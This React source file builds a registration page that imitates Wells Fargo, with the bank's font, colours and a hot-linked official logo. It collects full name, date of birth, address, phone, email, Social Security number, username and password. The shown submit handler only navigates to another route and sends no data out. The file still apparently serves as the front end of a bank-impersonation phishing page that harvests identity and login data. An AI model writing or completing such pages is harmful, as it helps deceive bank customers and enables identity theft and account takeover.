import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function Register() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    fullName: '', advisoryCustodian: '', dob: '', address: '',
    phone: '', email: '', ssn: '', username: '', password: '',
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    navigate('/accounts');
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', padding: '14px 16px', fontSize: '0.94rem', fontFamily: f,
    border: '1px solid #b5adad', borderRadius: '6px', outline: 'none',
    color: '#141414', backgroundColor: '#fff',
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '56px', display: 'flex', alignItems: 'center' }}>
        <div className="max-w-[1400px] mx-auto w-full" style={{ padding: '0 32px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
            <img
              src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png"
              alt="Wells Fargo"
              style={{ height: '20px', filter: 'brightness(0) invert(1)' }}
            />
          </a>
          <nav style={{ display: 'flex', alignItems: 'center', gap: '24px' }}>
            {['Open an Account', 'Customer Service', 'ATMs/Locations', 'Español'].map((item) => (
              <a key={item}  style={{ color: '#fff', textDecoration: 'none', fontSize: '0.76rem', fontFamily: f }} className="hover:underline">
                {item}
              </a>
            ))}
            <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
              <input
                type="text"
                placeholder="search"
                style={{
                  border: '1px solid rgba(255,255,255,0.5)', borderRadius: '4px',
                  backgroundColor: 'transparent', color: '#fff', padding: '4px 10px',
                  fontSize: '0.76rem', fontFamily: f, outline: 'none', width: '120px',
                }}
              />
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '16px', height: '16px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
          </nav>
        </div>
      </header>

      {/* Main content with background */}
      <div style={{
        flex: 1,
        backgroundImage: 'url(https://images.unsplash.com/photo-1490750967868-88aa4f44baee?w=1920&q=80)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '40px 20px',
      }}>
        {/* Form card */}
        <div style={{
          backgroundColor: 'rgba(255,255,255,0.95)',
          borderRadius: '12px',
          padding: '40px 48px',
          width: '100%',
          maxWidth: '640px',
          boxShadow: '0 8px 32px rgba(0,0,0,0.2)',
        }}>
          <h1 style={{
            fontFamily: f, fontSize: '2rem', fontWeight: 400, fontStyle: 'italic',
            color: '#141414', textAlign: 'center', margin: '0 0 32px',
          }}>
            Welcome
          </h1>

          <form onSubmit={handleSubmit}>
            {/* Row 1: Full Name + Advisory Custodian */}
            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
              <input type="text" name="fullName" placeholder="Full Name" value={form.fullName} onChange={handleChange} style={inputStyle} />
              <input type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
            </div>

            {/* Row 2: DOB + Address */}
            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
              <input type="date" name="dob" placeholder="DOB" value={form.dob} onChange={handleChange} style={inputStyle} />
              <input type="text" name="address" placeholder="Address" value={form.address} onChange={handleChange} style={inputStyle} />
            </div>

            {/* Row 3: Phone + Email */}
            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
              <input type="tel" name="phone" placeholder="Phone Number" value={form.phone} onChange={handleChange} style={inputStyle} />
              <input type="email" name="email" placeholder="Email" value={form.email} onChange={handleChange} style={inputStyle} />
            </div>

            {/* Row 4: SSN + Username */}
            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
              <input type="password" name="ssn" placeholder="SSN" value={form.ssn} onChange={handleChange} style={inputStyle} />
              <input type="text" name="username" placeholder="Username" value={form.username} onChange={handleChange} style={inputStyle} />
            </div>

            {/* Row 5: Password (full width) */}
            <div style={{ marginBottom: '28px' }}>
              <input type="password" name="password" placeholder="Password" value={form.password} onChange={handleChange} style={inputStyle} />
            </div>

            {/* Register button */}
            <div style={{ textAlign: 'center' }}>
              <button
                type="submit"
                style={{
                  backgroundColor: '#D71E28', color: '#fff', border: 'none',
                  borderRadius: '24px', fontFamily: f, fontWeight: 600,
                  fontSize: '1rem', padding: '12px 48px', cursor: 'pointer',
                  minWidth: '200px',
                }}
              >
                Register
              </button>
            </div>

            {/* Divider */}
            <div style={{ textAlign: 'center', margin: '20px 0', color: '#787070', fontSize: '0.88rem', fontFamily: f }}>
              or
            </div>

            {/* Sign On button */}
            <div style={{ textAlign: 'center' }}>
              <button
                type="button"
                onClick={() => navigate('/')}
                style={{
                  backgroundColor: '#fff', color: '#3b3331',
                  border: '1px solid #3b3331', borderRadius: '24px',
                  fontFamily: f, fontWeight: 600, fontSize: '0.94rem',
                  padding: '10px 32px', cursor: 'pointer', minWidth: '180px',
                }}
              >
                🔒 Sign On
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
